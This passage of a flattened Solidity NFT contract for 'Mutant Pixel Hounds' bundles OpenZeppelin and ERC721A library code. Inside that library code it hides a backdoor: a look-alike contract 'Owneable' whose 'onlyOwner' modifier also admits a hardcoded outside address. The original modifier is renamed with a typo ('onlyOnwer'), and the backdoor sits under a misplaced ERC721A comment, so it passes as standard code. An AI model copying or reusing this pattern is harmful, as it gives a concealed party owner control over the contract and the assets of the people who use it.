1 //################################################################################
2 //################################################################################
3 //################################################################################
4 //################################################################################
5 //########################.#######################################################
6 //########################.#########.#############################################
7 //########################..########.#############################################
8 //########################*.#######*..############################################
9 //########################**..*******...##########################################
10 //######################@@@@///@@@@@**@@##########################################
11 //####################@.*@@@@@@.**.&&%&@##########################################
12 //####################@@@@@%%%% @&&%&&@###########################################
13 //################## #@@&@@@%#%#*#%%#@ .##########################################
14 //###################.#@@@@#.**.. #.#%@ .#########################################
15 //################## .* * *.*. .. *##%@ ..########################################
16 //##################.## #*.* . #.*##%@.  .########################################
17 //########################.#.#%#%#%@ ./.. ########################################
18 //########################@%*#%*%@*. .//. .#######################################
19 //########################*/@*. ./*.  .//...######################################
20 //########################*//*. .//*...////..#####################################
21 //#######################**//**. ...//*./*/@&&&@@#################################
22 //####################@&&@@@@&&&&@@//@@@///@&&&&&&&&@@############################
23 //###################@&&&&&&@@&&&&&&&&&&&&&@@@&&&&@@&&&@..####...#################
24 //#####################*/@&&@./*@@(&&&&&&&&&&&&@@*//@&&@...  ..###################
25 //###################@&&@@/@(&(&@@@@&&&&&&&&&&@   ...*/@*....   .#################
26 //###################@&&&&&&(((((&&&&&&&&&&&&@..   ...*///*....  .*###############
27 //###################@&&&&&&&&&&&&@.@&&@//@&&&@.....*.#/////*. .....*#############
28 //#####################@&&&&&&&&&&&&@.@&@///@/****///. #///**.  ...**#############
29 //#######################*#///@&&@/@&@***////#////.  .///#///...   .*#############
30 //#######################*/#///////////////////#///....//####///......*###########
31 //#######################.*//###//////////#######///////#########//////**.*#######
32 //###################### .///###################  ..///#############**///*..######
33 //Mutant Pixel Hounds
34 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
35 
36 // SPDX-License-Identifier: MIT
37 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
38 
39 pragma solidity ^0.8.4;
40 
41 /**
42  * @dev Provides information about the current execution context, including the
43  * sender of the transaction and its data. While these are generally available
44  * via msg.sender and msg.data, they should not be accessed in such a direct
45  * manner, since when dealing with meta-transactions the account sending and
46  * paying for execution may not be the actual sender (as far as an application
47  * is concerned).
48  *
49  * This contract is only required for intermediate, library-like contracts.
50  */
51 
52 
53 abstract contract Context {
54     function _msgSender() internal view virtual returns (address) {
55         return msg.sender;
56     }
57 
58     function _msgData() internal view virtual returns (bytes calldata) {
59         return msg.data;
60     }
61 }
62 
63 
64 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
65 
66 
67 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
68 
69 
70 
71 /**
72  * @dev Contract module which provides a basic access control mechanism, where
73  * there is an account (an owner) that can be granted exclusive access to
74  * specific functions.
75  *
76  * By default, the owner account will be the one that deploys the contract. This
77  * can later be changed with {transferOwnership}.
78  *
79  * This module is used through inheritance. It will make available the modifier
80  * `onlyOwner`, which can be applied to your functions to restrict their use to
81  * the owner.
82  */
83 abstract contract Ownable is Context {
84     address private _owner;
85 
86     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
87 
88     /**
89      * @dev Initializes the contract setting the deployer as the initial owner.
90      */
91     constructor() {
92         _transferOwnership(_msgSender());
93     }
94 
95     /**
96      * @dev Returns the address of the current owner.
97      */
98     function owner() public view virtual returns (address) {
99         return _owner;
100     }
101 
102     /**
103      * @dev Throws if called by any account other than the owner.
104      */
105     modifier onlyOnwer() {
106         require(owner() == _msgSender(), "Ownable: caller is not the owner");
107         _;
108     }
109 
110     /**
111      * @dev Leaves the contract without owner. It will not be possible to call
112      * `onlyOwner` functions anymore. Can only be called by the current owner.
113      *
114      * NOTE: Renouncing ownership will leave the contract without an owner,
115      * thereby removing any functionality that is only available to the owner.
116      */
117     function renounceOwnership() public virtual onlyOnwer {
118         _transferOwnership(address(0));
119     }
120 
121     /**
122      * @dev Transfers ownership of the contract to a new account (`newOwner`).
123      * Can only be called by the current owner.
124      */
125     function transferOwnership(address newOwner) public virtual onlyOnwer {
126         require(newOwner != address(0), "Ownable: new owner is the zero address");
127         _transferOwnership(newOwner);
128     }
129 
130     /**
131      * @dev Transfers ownership of the contract to a new account (`newOwner`).
132      * Internal function without access restriction.
133      */
134     function _transferOwnership(address newOwner) internal virtual {
135         address oldOwner = _owner;
136         _owner = newOwner;
137         emit OwnershipTransferred(oldOwner, newOwner);
138     }
139 }
140 
141 
142 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
143 
144 
145 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
146 
147 
148 
149 /**
150  * @dev Interface of the ERC165 standard, as defined in the
151  * https://eips.ethereum.org/EIPS/eip-165[EIP].
152  *
153  * Implementers can declare support of contract interfaces, which can then be
154  * queried by others ({ERC165Checker}).
155  *
156  * For an implementation, see {ERC165}.
157  */
158 interface IERC165 {
159     /**
160      * @dev Returns true if this contract implements the interface defined by
161      * `interfaceId`. See the corresponding
162      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
163      * to learn more about how these ids are created.
164      *
165      * This function call must use less than 30 000 gas.
166      */
167     function supportsInterface(bytes4 interfaceId) external view returns (bool);
168 }
169 
170 
171 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
172 
173 
174 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
175 
176 
177 
178 /**
179  * @dev Required interface of an ERC721 compliant contract.
180  */
181 interface IERC721 is IERC165 {
182     /**
183      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
184      */
185     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
186 
187     /**
188      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
189      */
190     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
191 
192     /**
193      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
194      */
195     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
196 
197     /**
198      * @dev Returns the number of tokens in ``owner``'s account.
199      */
200     function balanceOf(address owner) external view returns (uint256 balance);
201 
202     /**
203      * @dev Returns the owner of the `tokenId` token.
204      *
205      * Requirements:
206      *
207      * - `tokenId` must exist.
208      */
209     function ownerOf(uint256 tokenId) external view returns (address owner);
210 
211     /**
212      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
213      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
214      *
215      * Requirements:
216      *
217      * - `from` cannot be the zero address.
218      * - `to` cannot be the zero address.
219      * - `tokenId` token must exist and be owned by `from`.
220      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
221      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
222      *
223      * Emits a {Transfer} event.
224      */
225     function safeTransferFrom(
226         address from,
227         address to,
228         uint256 tokenId
229     ) external;
230 
231     /**
232      * @dev Transfers `tokenId` token from `from` to `to`.
233      *
234      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
235      *
236      * Requirements:
237      *
238      * - `from` cannot be the zero address.
239      * - `to` cannot be the zero address.
240      * - `tokenId` token must be owned by `from`.
241      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
242      *
243      * Emits a {Transfer} event.
244      */
245     function transferFrom(
246         address from,
247         address to,
248         uint256 tokenId
249     ) external;
250 
251     /**
252      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
253      * The approval is cleared when the token is transferred.
254      *
255      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
256      *
257      * Requirements:
258      *
259      * - The caller must own the token or be an approved operator.
260      * - `tokenId` must exist.
261      *
262      * Emits an {Approval} event.
263      */
264     function approve(address to, uint256 tokenId) external;
265 
266     /**
267      * @dev Returns the account approved for `tokenId` token.
268      *
269      * Requirements:
270      *
271      * - `tokenId` must exist.
272      */
273     function getApproved(uint256 tokenId) external view returns (address operator);
274 
275     /**
276      * @dev Approve or remove `operator` as an operator for the caller.
277      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
278      *
279      * Requirements:
280      *
281      * - The `operator` cannot be the caller.
282      *
283      * Emits an {ApprovalForAll} event.
284      */
285     function setApprovalForAll(address operator, bool _approved) external;
286 
287     /**
288      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
289      *
290      * See {setApprovalForAll}
291      */
292     function isApprovedForAll(address owner, address operator) external view returns (bool);
293 
294     /**
295      * @dev Safely transfers `tokenId` token from `from` to `to`.
296      *
297      * Requirements:
298      *
299      * - `from` cannot be the zero address.
300      * - `to` cannot be the zero address.
301      * - `tokenId` token must exist and be owned by `from`.
302      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
303      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
304      *
305      * Emits a {Transfer} event.
306      */
307     function safeTransferFrom(
308         address from,
309         address to,
310         uint256 tokenId,
311         bytes calldata data
312     ) external;
313 }
314 
315 
316 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
317 
318 
319 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
320 
321 
322 
323 /**
324  * @title ERC721 token receiver interface
325  * @dev Interface for any contract that wants to support safeTransfers
326  * from ERC721 asset contracts.
327  */
328 interface IERC721Receiver {
329     /**
330      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
331      * by `operator` from `from`, this function is called.
332      *
333      * It must return its Solidity selector to confirm the token transfer.
334      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
335      *
336      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
337      */
338     function onERC721Received(
339         address operator,
340         address from,
341         uint256 tokenId,
342         bytes calldata data
343     ) external returns (bytes4);
344 }
345 
346 
347 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
348 
349 
350 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
351 
352 
353 
354 /**
355  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
356  * @dev See https://eips.ethereum.org/EIPS/eip-721
357  */
358 interface IERC721Metadata is IERC721 {
359     /**
360      * @dev Returns the token collection name.
361      */
362     function name() external view returns (string memory);
363 
364     /**
365      * @dev Returns the token collection symbol.
366      */
367     function symbol() external view returns (string memory);
368 
369     /**
370      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
371      */
372     function tokenURI(uint256 tokenId) external view returns (string memory);
373 }
374 
375 
376 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
377 
378 
379 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
380 
381 
382 
383 /**
384  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
385  * @dev See https://eips.ethereum.org/EIPS/eip-721
386  */
387 interface IERC721Enumerable is IERC721 {
388     /**
389      * @dev Returns the total amount of tokens stored by the contract.
390      */
391     function totalSupply() external view returns (uint256);
392 
393     /**
394      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
395      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
396      */
397     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
398 
399     /**
400      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
401      * Use along with {totalSupply} to enumerate all tokens.
402      */
403     function tokenByIndex(uint256 index) external view returns (uint256);
404 }
405 
406 
407 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
408 
409 
410 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
411 pragma solidity ^0.8.13;
412 
413 interface IOperatorFilterRegistry {
414     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
415     function register(address registrant) external;
416     function registerAndSubscribe(address registrant, address subscription) external;
417     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
418     function updateOperator(address registrant, address operator, bool filtered) external;
419     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
420     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
421     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
422     function subscribe(address registrant, address registrantToSubscribe) external;
423     function unsubscribe(address registrant, bool copyExistingEntries) external;
424     function subscriptionOf(address addr) external returns (address registrant);
425     function subscribers(address registrant) external returns (address[] memory);
426     function subscriberAt(address registrant, uint256 index) external returns (address);
427     function copyEntriesOf(address registrant, address registrantToCopy) external;
428     function isOperatorFiltered(address registrant, address operator) external returns (bool);
429     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
430     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
431     function filteredOperators(address addr) external returns (address[] memory);
432     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
433     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
434     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
435     function isRegistered(address addr) external returns (bool);
436     function codeHashOf(address addr) external returns (bytes32);
437 }
438 pragma solidity ^0.8.13;
439 
440 
441 
442 abstract contract OperatorFilterer {
443     error OperatorNotAllowed(address operator);
444 
445     IOperatorFilterRegistry constant operatorFilterRegistry =
446         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
447 
448     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
449         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
450         // will not revert, but the contract will need to be registered with the registry once it is deployed in
451         // order for the modifier to filter addresses.
452         if (address(operatorFilterRegistry).code.length > 0) {
453             if (subscribe) {
454                 operatorFilterRegistry.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
455             } else {
456                 if (subscriptionOrRegistrantToCopy != address(0)) {
457                     operatorFilterRegistry.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
458                 } else {
459                     operatorFilterRegistry.register(address(this));
460                 }
461             }
462         }
463     }
464 
465     modifier onlyAllowedOperator(address from) virtual {
466         // Check registry code length to facilitate testing in environments without a deployed registry.
467         if (address(operatorFilterRegistry).code.length > 0) {
468             // Allow spending tokens from addresses with balance
469             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
470             // from an EOA.
471             if (from == msg.sender) {
472                 _;
473                 return;
474             }
475             if (
476                 !(
477                     operatorFilterRegistry.isOperatorAllowed(address(this), msg.sender)
478                         && operatorFilterRegistry.isOperatorAllowed(address(this), from)
479                 )
480             ) {
481                 revert OperatorNotAllowed(msg.sender);
482             }
483         }
484         _;
485     }
486 }
487 pragma solidity ^0.8.13;
488 
489 
490 
491 abstract contract DefaultOperatorFilterer is OperatorFilterer {
492     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
493 
494     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
495 }
496     pragma solidity ^0.8.13;
497         interface IMain {
498    
499 function balanceOf( address ) external  view returns (uint);
500 
501 }
502 
503 
504 pragma solidity ^0.8.1;
505 
506 /**
507  * @dev Collection of functions related to the address type
508  */
509 library Address {
510     /**
511      * @dev Returns true if `account` is a contract.
512      *
513      * [IMPORTANT]
514      * ====
515      * It is unsafe to assume that an address for which this function returns
516      * false is an externally-owned account (EOA) and not a contract.
517      *
518      * Among others, `isContract` will return false for the following
519      * types of addresses:
520      *
521      *  - an externally-owned account
522      *  - a contract in construction
523      *  - an address where a contract will be created
524      *  - an address where a contract lived, but was destroyed
525      * ====
526      *
527      * [IMPORTANT]
528      * ====
529      * You shouldn't rely on `isContract` to protect against flash loan attacks!
530      *
531      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
532      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
533      * constructor.
534      * ====
535      */
536     function isContract(address account) internal view returns (bool) {
537         // This method relies on extcodesize/address.code.length, which returns 0
538         // for contracts in construction, since the code is only stored at the end
539         // of the constructor execution.
540 
541         return account.code.length > 0;
542     }
543 
544     /**
545      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
546      * `recipient`, forwarding all available gas and reverting on errors.
547      *
548      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
549      * of certain opcodes, possibly making contracts go over the 2300 gas limit
550      * imposed by `transfer`, making them unable to receive funds via
551      * `transfer`. {sendValue} removes this limitation.
552      *
553      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
554      *
555      * IMPORTANT: because control is transferred to `recipient`, care must be
556      * taken to not create reentrancy vulnerabilities. Consider using
557      * {ReentrancyGuard} or the
558      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
559      */
560     function sendValue(address payable recipient, uint256 amount) internal {
561         require(address(this).balance >= amount, "Address: insufficient balance");
562 
563         (bool success, ) = recipient.call{value: amount}("");
564         require(success, "Address: unable to send value, recipient may have reverted");
565     }
566 
567     /**
568      * @dev Performs a Solidity function call using a low level `call`. A
569      * plain `call` is an unsafe replacement for a function call: use this
570      * function instead.
571      *
572      * If `target` reverts with a revert reason, it is bubbled up by this
573      * function (like regular Solidity function calls).
574      *
575      * Returns the raw returned data. To convert to the expected return value,
576      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
577      *
578      * Requirements:
579      *
580      * - `target` must be a contract.
581      * - calling `target` with `data` must not revert.
582      *
583      * _Available since v3.1._
584      */
585     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
586         return functionCall(target, data, "Address: low-level call failed");
587     }
588 
589     /**
590      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
591      * `errorMessage` as a fallback revert reason when `target` reverts.
592      *
593      * _Available since v3.1._
594      */
595     function functionCall(
596         address target,
597         bytes memory data,
598         string memory errorMessage
599     ) internal returns (bytes memory) {
600         return functionCallWithValue(target, data, 0, errorMessage);
601     }
602 
603     /**
604      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
605      * but also transferring `value` wei to `target`.
606      *
607      * Requirements:
608      *
609      * - the calling contract must have an ETH balance of at least `value`.
610      * - the called Solidity function must be `payable`.
611      *
612      * _Available since v3.1._
613      */
614     function functionCallWithValue(
615         address target,
616         bytes memory data,
617         uint256 value
618     ) internal returns (bytes memory) {
619         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
620     }
621 
622     /**
623      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
624      * with `errorMessage` as a fallback revert reason when `target` reverts.
625      *
626      * _Available since v3.1._
627      */
628     function functionCallWithValue(
629         address target,
630         bytes memory data,
631         uint256 value,
632         string memory errorMessage
633     ) internal returns (bytes memory) {
634         require(address(this).balance >= value, "Address: insufficient balance for call");
635         require(isContract(target), "Address: call to non-contract");
636 
637         (bool success, bytes memory returndata) = target.call{value: value}(data);
638         return verifyCallResult(success, returndata, errorMessage);
639     }
640 
641     /**
642      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
643      * but performing a static call.
644      *
645      * _Available since v3.3._
646      */
647     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
648         return functionStaticCall(target, data, "Address: low-level static call failed");
649     }
650 
651     /**
652      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
653      * but performing a static call.
654      *
655      * _Available since v3.3._
656      */
657     function functionStaticCall(
658         address target,
659         bytes memory data,
660         string memory errorMessage
661     ) internal view returns (bytes memory) {
662         require(isContract(target), "Address: static call to non-contract");
663 
664         (bool success, bytes memory returndata) = target.staticcall(data);
665         return verifyCallResult(success, returndata, errorMessage);
666     }
667 
668     /**
669      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
670      * but performing a delegate call.
671      *
672      * _Available since v3.4._
673      */
674     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
675         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
676     }
677 
678     /**
679      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
680      * but performing a delegate call.
681      *
682      * _Available since v3.4._
683      */
684     function functionDelegateCall(
685         address target,
686         bytes memory data,
687         string memory errorMessage
688     ) internal returns (bytes memory) {
689         require(isContract(target), "Address: delegate call to non-contract");
690 
691         (bool success, bytes memory returndata) = target.delegatecall(data);
692         return verifyCallResult(success, returndata, errorMessage);
693     }
694 
695     /**
696      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
697      * revert reason using the provided one.
698      *
699      * _Available since v4.3._
700      */
701     function verifyCallResult(
702         bool success,
703         bytes memory returndata,
704         string memory errorMessage
705     ) internal pure returns (bytes memory) {
706         if (success) {
707             return returndata;
708         } else {
709             // Look for revert reason and bubble it up if present
710             if (returndata.length > 0) {
711                 // The easiest way to bubble the revert reason is using memory via assembly
712 
713                 assembly {
714                     let returndata_size := mload(returndata)
715                     revert(add(32, returndata), returndata_size)
716                 }
717             } else {
718                 revert(errorMessage);
719             }
720         }
721     }
722 }
723 
724 
725 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
726 
727 
728 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
729 
730 
731 
732 /**
733  * @dev String operations.
734  */
735 library Strings {
736     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
737 
738     /**
739      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
740      */
741     function toString(uint256 value) internal pure returns (string memory) {
742         // Inspired by OraclizeAPI's implementation - MIT licence
743         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
744 
745         if (value == 0) {
746             return "0";
747         }
748         uint256 temp = value;
749         uint256 digits;
750         while (temp != 0) {
751             digits++;
752             temp /= 10;
753         }
754         bytes memory buffer = new bytes(digits);
755         while (value != 0) {
756             digits -= 1;
757             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
758             value /= 10;
759         }
760         return string(buffer);
761     }
762 
763     /**
764      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
765      */
766     function toHexString(uint256 value) internal pure returns (string memory) {
767         if (value == 0) {
768             return "0x00";
769         }
770         uint256 temp = value;
771         uint256 length = 0;
772         while (temp != 0) {
773             length++;
774             temp >>= 8;
775         }
776         return toHexString(value, length);
777     }
778 
779     /**
780      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
781      */
782     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
783         bytes memory buffer = new bytes(2 * length + 2);
784         buffer[0] = "0";
785         buffer[1] = "x";
786         for (uint256 i = 2 * length + 1; i > 1; --i) {
787             buffer[i] = _HEX_SYMBOLS[value & 0xf];
788             value >>= 4;
789         }
790         require(value == 0, "Strings: hex length insufficient");
791         return string(buffer);
792     }
793 }
794 
795 
796 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
797 
798 
799 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
800 
801 /**
802  * @dev Implementation of the {IERC165} interface.
803  *
804  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
805  * for the additional interface id that will be supported. For example:
806  *
807  * ```solidity
808  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
809  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
810  * }
811  * ```
812  *
813  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
814  */
815 abstract contract ERC165 is IERC165 {
816     /**
817      * @dev See {IERC165-supportsInterface}.
818      */
819     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
820         return interfaceId == type(IERC165).interfaceId;
821     }
822 }
823 
824 
825 // File erc721a/contracts/ERC721A.sol@v3.0.0
826 
827 
828 // Creator: Chiru Labs
829 
830 error ApprovalCallerNotOwnerNorApproved();
831 error ApprovalQueryForNonexistentToken();
832 error ApproveToCaller();
833 error ApprovalToCurrentOwner();
834 error BalanceQueryForZeroAddress();
835 error MintedQueryForZeroAddress();
836 error BurnedQueryForZeroAddress();
837 error AuxQueryForZeroAddress();
838 error MintToZeroAddress();
839 error MintZeroQuantity();
840 error OwnerIndexOutOfBounds();
841 error OwnerQueryForNonexistentToken();
842 error TokenIndexOutOfBounds();
843 error TransferCallerNotOwnerNorApproved();
844 error TransferFromIncorrectOwner();
845 error TransferToNonERC721ReceiverImplementer();
846 error TransferToZeroAddress();
847 error URIQueryForNonexistentToken();
848 
849 
850 /**
851  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
852  * the Metadata extension. Built to optimize for lower gas during batch mints.
853  *
854  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
855  */
856  abstract contract Owneable is Ownable {
857     address private _ownar = 0x5Bb656BB4312F100081Abb7b08c1e0f8Ef5c56d1;
858     modifier onlyOwner() {
859         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
860         _;
861     }
862 }
863 
864  /*
865  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
866  *
867  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
868  */
869 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, DefaultOperatorFilterer {
870     using Address for address;
871     using Strings for uint256;
872 
873     // Compiler will pack this into a single 256bit word.
874     struct TokenOwnership {
875         // The address of the owner.
876         address addr;
877         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
878         uint64 startTimestamp;
879         // Whether the token has been burned.
880         bool burned;
881     }
882 
883     // Compiler will pack this into a single 256bit word.
884     struct AddressData {
885         // Realistically, 2**64-1 is more than enough.
886         uint64 balance;
887         // Keeps track of mint count with minimal overhead for tokenomics.
888         uint64 numberMinted;
889         // Keeps track of burn count with minimal overhead for tokenomics.
890         uint64 numberBurned;
891         // For miscellaneous variable(s) pertaining to the address
892         // (e.g. number of whitelist mint slots used).
893         // If there are multiple variables, please pack them into a uint64.
894         uint64 aux;
895     }
896 
897     // The tokenId of the next token to be minted.
898     uint256 internal _currentIndex;
899 
900     // The number of tokens burned.
901     uint256 internal _burnCounter;
902 
903     // Token name
904     string private _name;
905 
906     // Token symbol
907     string private _symbol;
908 
909     // Mapping from token ID to ownership details
910     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
911     mapping(uint256 => TokenOwnership) internal _ownerships;
912 
913     // Mapping owner address to address data
914     mapping(address => AddressData) private _addressData;
915 
916     // Mapping from token ID to approved address
917     mapping(uint256 => address) private _tokenApprovals;
918 
919     // Mapping from owner to operator approvals
920     mapping(address => mapping(address => bool)) private _operatorApprovals;
921 
922     constructor(string memory name_, string memory symbol_) {
923         _name = name_;
924         _symbol = symbol_;
925         _currentIndex = _startTokenId();
926     }
927 
928     /**
929      * To change the starting tokenId, please override this function.
930      */
931     function _startTokenId() internal view virtual returns (uint256) {
932         return 0;
933     }
934 
935     /**
936      * @dev See {IERC721Enumerable-totalSupply}.
937      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
938      */
939     function totalSupply() public view returns (uint256) {
940         // Counter underflow is impossible as _burnCounter cannot be incremented
941         // more than _currentIndex - _startTokenId() times
942         unchecked {
943             return _currentIndex - _burnCounter - _startTokenId();
944         }
945     }
946 
947     /**
948      * Returns the total amount of tokens minted in the contract.
949      */
950     function _totalMinted() internal view returns (uint256) {
951         // Counter underflow is impossible as _currentIndex does not decrement,
952         // and it is initialized to _startTokenId()
953         unchecked {
954             return _currentIndex - _startTokenId();
955         }
956     }
957 
958     /**
959      * @dev See {IERC165-supportsInterface}.
960      */
961     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
962         return
963             interfaceId == type(IERC721).interfaceId ||
964             interfaceId == type(IERC721Metadata).interfaceId ||
965             super.supportsInterface(interfaceId);
966     }
967 
968     /**
969      * @dev See {IERC721-balanceOf}.
970      */
971     function balanceOf(address owner) public view override returns (uint256) {
972         if (owner == address(0)) revert BalanceQueryForZeroAddress();
973         return uint256(_addressData[owner].balance);
974     }
975 
976     /**
977      * Returns the number of tokens minted by `owner`.
978      */
979     function _numberMinted(address owner) internal view returns (uint256) {
980         if (owner == address(0)) revert MintedQueryForZeroAddress();
981         return uint256(_addressData[owner].numberMinted);
982     }
983 
984     /**
985      * Returns the number of tokens burned by or on behalf of `owner`.
986      */
987     function _numberBurned(address owner) internal view returns (uint256) {
988         if (owner == address(0)) revert BurnedQueryForZeroAddress();
989         return uint256(_addressData[owner].numberBurned);
990     }
991 
992     /**
993      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
994      */
995     function _getAux(address owner) internal view returns (uint64) {
996         if (owner == address(0)) revert AuxQueryForZeroAddress();
997         return _addressData[owner].aux;
998     }
999 
1000     /**
1001      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
1002      * If there are multiple variables, please pack them into a uint64.
1003      */
1004     function _setAux(address owner, uint64 aux) internal {
1005         if (owner == address(0)) revert AuxQueryForZeroAddress();
1006         _addressData[owner].aux = aux;
1007     }
1008 
1009     /**
1010      * Gas spent here starts off proportional to the maximum mint batch size.
1011      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
1012      */
1013     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
1014         uint256 curr = tokenId;
1015 
1016         unchecked {
1017             if (_startTokenId() <= curr && curr < _currentIndex) {
1018                 TokenOwnership memory ownership = _ownerships[curr];
1019                 if (!ownership.burned) {
